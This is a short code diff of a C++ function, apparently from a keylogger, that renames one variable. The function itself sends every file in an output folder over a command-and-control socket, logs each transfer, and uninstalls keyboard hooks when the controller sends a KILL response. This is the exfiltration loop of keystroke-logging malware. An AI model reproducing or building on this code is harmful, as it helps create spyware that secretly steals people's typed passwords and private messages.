@@ -68,8 +68,8 @@ void DumpCache()
 	try {
 		for (const auto& entry : std::filesystem::directory_iterator(IO::GetOutputPath(false)))
 		{
-			std::string filename = Utils::ToString(entry.path());
-			RESPONSE_CODE res = ccSocket.SendFile(filename);
+			std::string path = Utils::ToString(entry.path());
+			RESPONSE_CODE res = ccSocket.SendFile(path);
 			if (res == KILL)
 			{
 				KeyboardManager::GetInstance().UninstallHooks();
@@ -79,11 +79,11 @@ void DumpCache()
 			else if (res == SUCCESS)
 			{
 				// TODO delete file
-				IO::WriteAppLog("Successfully sent file [" + filename + "]");
+				IO::WriteAppLog("Successfully sent file [" + path + "]");
 			}
 			else
 			{
-				IO::WriteAppLog("File [" + filename + "] failed to send");
+				IO::WriteAppLog("File [" + path + "] failed to send");
 			}
 		}
 	}
